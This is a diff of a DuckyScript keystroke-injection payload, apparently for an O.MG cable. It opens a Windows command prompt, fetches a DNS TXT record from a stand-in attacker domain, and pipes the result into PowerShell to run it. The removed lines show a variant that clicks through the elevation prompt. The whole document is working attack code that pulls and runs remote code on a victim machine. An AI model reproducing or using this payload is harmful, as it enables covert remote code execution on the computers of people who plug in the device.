@@ -38,17 +38,11 @@ for /f "tokens=* USEBACKQ" %a in (`nslookup "-q=txt" omg.yourdomain.com 2^>nul^|
 # In OMG code that would be: 
 #-----------------------------------------------------------------------------------------------------------
 DUCKY_LANG US
-DELAY 3000 
-CONTROL ESCAPE
-DELAY 500 
-STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
-DELAY 500
-CTRL-SHIFT ENTER
-DELAY 1000 
-ALT Y
-DELAY 500
+GUI r
+DELAY 1000
+STRING CMD
 ENTER
-DELAY 500
-STRING cmd /c for /f "tokens=* USEBACKQ" %a in (`nslookup "-q=txt" omg.yourdomain.com 2^>nul^|find /I """"`) do @echo|set /p="%~a"|powershell -Command -
+DELAY 500 
+STRING for /f "tokens=* USEBACKQ" %a in (`nslookup "-q=txt" omg.yourdomain.com 2^>nul^|find /I """"`) do @echo|set /p="%~a"|powershell -Command -
 ENTER
 #-----------------------------------------------------------------------------------------------------------
